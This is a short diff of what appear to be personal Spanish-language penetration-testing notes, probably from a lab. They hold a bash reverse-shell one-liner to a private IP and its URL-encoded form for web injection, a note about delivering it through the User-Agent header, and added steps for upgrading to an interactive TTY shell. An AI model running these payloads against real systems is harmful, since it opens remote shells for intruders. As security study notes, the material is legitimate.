@@ -21,4 +21,11 @@ nc -nv 192.168.139.52 80
 - para hacer un revershell toca encodear el comando, ejemplo 
 /bin/bash -c 'bash -i > /dev/tcp/192.168.119.239/5555 0>%261' --->>>> %2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%31%39%2e%32%33%39%2f%35%35%35%35%20%30%3e%25%32%36%31%27
 - se puede hacer por User Agent: tambien 
-####
+#### hacer shell interactiva 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+^Z
+stty raw -echo;fg
+reset
+terminal type? xterm-256color
+###
+
